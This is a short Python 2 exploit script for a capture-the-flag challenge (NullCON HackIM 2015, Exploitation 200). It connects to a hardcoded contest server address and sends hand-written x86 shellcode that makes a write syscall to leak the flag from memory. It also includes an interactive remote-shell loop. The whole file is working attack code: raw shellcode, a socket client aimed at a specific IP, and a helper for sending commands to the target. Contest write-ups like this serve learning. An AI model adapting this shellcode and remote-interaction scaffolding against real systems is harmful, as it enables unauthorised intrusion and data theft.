#!/usr/bin/python
#
# NullCON HackIM 2015
# Exploitation 200
# @danigargu
#

import os
import sys
import time
from socket import *
from struct import pack

HOST = '54.163.248.69'
PORT = 9001

p = lambda x : pack("<L" , x)

def get_connection(host, port):
  s = socket(AF_INET, SOCK_STREAM)
  s.connect((HOST, PORT))
  return s

def interact(s):
  while True:
    try:
      sys.stdout.write("$ ")
      sys.stdout.flush()
      c = sys.stdin.readline()
      s.send(c)
      time.sleep(0.5)
      sys.stdout.write(s.recv(4096))
    except KeyboardInterrupt, e:
      print " quit"
      s.close()
      break

def main():

  sc = ("\x31\xc0"      #  xor   eax, eax
        "\x31\xdb"      #  xor   ebx, ebx
        "\x31\xd2"      #  xor   edx, edx
        "\xB0\x04"      #  mov   al, 4
        "\xB3\x01"      #  mov   bl, 1
        "\x8B\x4D\xE0"  #  mov   ecx, [ebp-20h]
        "\xB2\xFF"      #  mov   dl, 0FFh
        "\xCD\x80")     #  int   80h

  s = get_connection(HOST, PORT)

  s.send(sc)
  time.sleep(0.5)
  print "Flag: %s" % s.recv(0xFF)

if __name__ == '__main__':
  main()

